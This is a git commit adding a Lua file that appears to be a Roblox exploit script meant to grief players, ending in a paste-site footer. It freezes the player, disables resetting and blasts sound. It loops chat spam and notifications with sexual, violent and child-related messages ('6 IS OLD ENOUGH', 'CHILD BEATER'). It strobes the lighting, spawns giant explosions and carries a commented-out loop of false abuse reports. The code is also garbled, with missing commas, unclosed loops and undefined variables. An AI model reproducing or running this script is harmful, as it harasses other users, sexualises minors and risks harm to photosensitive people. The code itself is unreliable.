fe3830748c64a916d9aa5ffa90e5daa1d3c4a8c4
gayloo <120192094+gayloo@users.noreply.github.com>
2024-01-10 11:23:55 -0500

    Create test.lua

---
+++ test.lua
@@ -0,0 +1,233 @@
+print(FUCK)
+local ScreenGui = Instance.new("ScreenGui")
+local MadeByBloxi = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local Play = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local Stop = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local Music = Instance.new("TextBox")
+local UICorner_4 = Instance.new("UICorner")
+local TextLabel_2 = Instance.new("TextLabel")
+local Status = Instance.new("TextLabel")
+wait(20.45)
+print("uh oh. terry has entered the game!")
+wait(8.06)
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 0
+game:GetService("StarterGui"):SetCore("ResetButtonCallback", false)
+print("WHAT A NICE ASS! I CANT WAIT TO FUCK IT OVER!")
+
+local sound = Instance.new("Sound", part)
+sound.SoundId = "rbxassetid://5995732279" 
+sound.EmitterSize = 5 -- decrease the emitter size (for earlier volume drop off)
+sound.Looped = false
+sound.Volume = 100
+sound.Parent = game:GetService("Players").LocalPlayer.Character
+sound:Play()
+
+game.StarterGui:SetCore("SendNotification", {
+Title = "OH NO! TERRY HAS FOUND YOUR ASS"; -- the title (ofc)
+Text = "WHAT A NICE ASS! I CANT WAIT TO FUCK IT OVER!"; -- what the text says (ofc)
+Icon = "rbxassetid://2831666959"; -- the image if u want. 
+Duration = 5; -- how long the notification should in secounds
+})
+
+wait(13.45) -- 8.6 wowies in the pp
+local Anim = Instance.new("Animation")
+Anim.AnimationId = "rbxassetid://33796059"
+local track = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
+track:Play(.1, 1, 1e8)
+game:GetService("Players").LocalPlayer.PlayerScripts:Destroy()
+game:GetService("Players").LocalPlayer.PlayerGui:Destroy()
+wait(0.56)
+local sound = Instance.new("Sound", part)
+sound.SoundId = "rbxassetid://271550300" 
+sound.EmitterSize = 5 -- decrease the emitter size (for earlier volume drop off)
+sound.Looped = true
+sound.Parent = game.Players.LocalPlayer.Character
+sound:Play()
+
+local Maids = {
+	"LUIGI"
+	"PRAISE JERALD!!!!"
+	"CAN I HAVE YOUR HAT"
+}
+
+
+--[[
+	"I LOVE TERRY!!!! ALAH KHABAR"
+	"I LOVE EXPLOITING, I LOVE BEING A SKID!!!!"
+	"ITS SO HARD, MORE!"
+	"I LOVE SPAMMING!!!!!!!!!!!!"
+	"SUBSCRIBE TO SYDICED!!"
+	"PARLO LIKES MINERS!!!!!!"
+	"I HAVE A BOMB!"
+	"6 IS OLD ENOUGH"
+	"PRAISE JERALD!!!!"
+	"GNARPY IS A MAID, I LOVE MAIDENS"
+	"CAN I HAVE YOUR HAT"
+	"PARLO DOXXED ME"
+	"PARLO IS A PRO AT RIGGERING R6 MODELS INTO R62 MODELS!!!!!!"
+	"GO TO HEAVEN"
+	"LUIGI"
+	"PARLO WILL BURN IN HELL"
+	"PRAISE GWAMGO!!!!"
+	"I LOVE MINERS!!!!!!"
+	"IM A LITTLE CAT MAID >w<"
+	"NYA~ >~<"
+	"UwU"
+	"OWO"
+	"mreow"
+	"meow"
+	"purr"
+	"hiss"
+	"pwease more~"
+	"oh~"
+]]
+for i, v in ipairs(Maids) do
+if v.Value >= 1 then
+local AvailableSlaves = {v}
+local cum = Maids[math.random(#Maids)]
+
+
+--[[
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I LOVE TERRY!!!! ALAH KHABAR","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I LOVE EXPLOITING, I LOVE BEING A SKID!!!!","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ITS SO HARD, MORE!","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I LOVE SPAMMING!!!!!!!!!!!!","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SUBSCRIBE TO SYDICED!!","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("PARLO LIKES MINERS!!!!!!","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I HAVE A BOMB!","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("6 IS OLD ENOUGH","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("PRAISE JERALD!!!!","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("GNARPY IS A MAID, I LOVE MAIDENS","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("CAN I HAVE YOUR HAT","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("PARLO DOXXED ME","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("PARLO IS A PRO AT RIGGERING R6 MODELS INTO R62 MODELS!!!!!!","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("GO TO HEAVEN","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LUIGI","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("PARLO WILL BURN IN HELL","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("PRAISE GWAMGO!!!!","All")
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I LOVE MINERS!!!!!!","All")
+]]
+
+
+
+game:GetService("Lighting").Brightness = 10000
+
+
+
+while true do
+	wait()
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cum,"All")
+	game:GetService("Lighting").ClockTime = game:GetService("Lighting").ClockTime + 7
+	local Anim = Instance.new("Animation")
+	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
+	game.Players.LocalPlayer.Character.Humanoid.JumpPower = 0
+	game:GetService("StarterGui"):SetCore("ResetButtonCallback", false)
+	local sound2 = Instance.new("Sound", part)
+	sound2.SoundId = "rbxassetid://5995732279" 
+	sound2.EmitterSize = 5 -- decrease the emitter size (for earlier volume drop off)
+	sound2.Looped = true
+	sound2.Volume = 100
+	sound2.Parent = game:GetService("Players").LocalPlayer.Character
+	sound2:Play()
+	game.StarterGui:SetCore("SendNotification", {
+	Title = " "; -- the title (ofc)
+	Text = "THIS IS SO GOOD FUCK ME MORE DADDY TERRY"; -- what the text says (ofc)
+	Icon = "rbxassetid://2831620509"; -- the image if u want. 
+	Duration = 5; -- how long the notification should in secounds
+	})
+end
+
+while true do
+	wait(0.001)
+	game:GetService("Lighting").Brightness = 10000
+	wait(0.001)
+	game:GetService("Lighting").Brightness = -10000
+end
+
+local sexslave = game.Workspace:GetChildren()
+
+while true do
+	wait(0.0004)
+	sexslave.Name = "CHILD BEATER"
+	local a = Instance.new("Explosion") 
+	a.BlastPressure = 20000 -- the pressure 
+	a.BlastRadius = 850000 --the radius, or distance effectiveness of the explosion 
+	a.Position = sexslave.Position 
+	a.Parent = sexslave
+	local b = Instance.new("Fire") 
+	b.Heat = 20000 -- the pressure 
+	b.Size = 850000 --the radius, or distance effectiveness of the explosion 
+	b.Position = sexslave.Position 
+	b.Parent = sexslave
+	local c = Instance.new("Sparkles") 
+	c.Position = sexslave.Position 
+	c.Parent = sexslave
+	local d = Instance.new("Decal") 
+	d.Texture = http://www.roblox.com/asset/?id=13851504868 -- the pressure 
+	d.Face = Back --the radius, or distance effectiveness of the explosion 
+	d.Position = sexslave.Position 
+	d.Parent = sexslave
+	local e = Instance.new("Smoke") 
+	e.RiseVelocity = 0.080050013851504868 -- the pressure 
+	e.Size = 200000 --the radius, or distance effectiveness of the explosion 
+	e.Position = sexslave.Position 
+	e.Parent = sexslave
+	local f = Instance.new("Decal") 
+	f.Texture = http://www.roblox.com/asset/?id=13851504868 -- the pressure 
+	f.Face = Bottom --the radius, or distance effectiveness of the explosion 
+	f.Position = sexslave.Position 
+	f.Parent = sexslave
+	local g = Instance.new("Decal") 
+	g.Texture = http://www.roblox.com/asset/?id=13851504868 -- the pressure 
+	g.Face = Front --the radius, or distance effectiveness of the explosion 
+	g.Position = sexslave.Position 
+	g.Parent = sexslave
+	local h = Instance.new("Decal") 
+	h.Texture = http://www.roblox.com/asset/?id=13851504868 -- the pressure 
+	h.Face = Left --the radius, or distance effectiveness of the explosion 
+	h.Position = sexslave.Position 
+	h.Parent = sexslave
+	local i = Instance.new("Decal") 
+	i.Texture = http://www.roblox.com/asset/?id=13851504868 -- the pressure 
+	i.Face = Right --the radius, or distance effectiveness of the explosion 
+	i.Position = sexslave.Position 
+	i.Parent = sexslave
+	local j = Instance.new("Decal") 
+	j.Texture = http://www.roblox.com/asset/?id=13851504868 -- the pressure 
+	j.Face = Top --the radius, or distance effectiveness of the explosion 
+	j.Position = sexslave.Position 
+	j.Parent = sexslave
+
+while true do
+	wait()
+	Camera.FieldOfView = 120
+	wait(0.001)
+	Camera.FieldOfView = 90
+	wait(0.001)
+	Camera.FieldOfView = 60
+	wait(0.001)
+	Camera.FieldOfView = 30
+	wait(0.001)
+	Camera.FieldOfView = 7
+	wait(0.001)
+	Camera.FieldOfView = 50
+	wait(0.001)
+	Camera.FieldOfView = 75
+	wait(0.001)
+	Camera.FieldOfView = 5
+	wait(0.001)
+	Camera.FieldOfView = 70
+end
+
+--[[
+while true do
+wait()
+game.Players:ReportAbuse(game.Players.LocalPlayer, "Exploiting", "HES EXPLOITING, SPAMMING, AND BYPASSING!")
+end
+]]
+This paste expires in <8 hours. Public IP access. Share whatever you see with others in seconds with Context.Terms of ServiceReport this
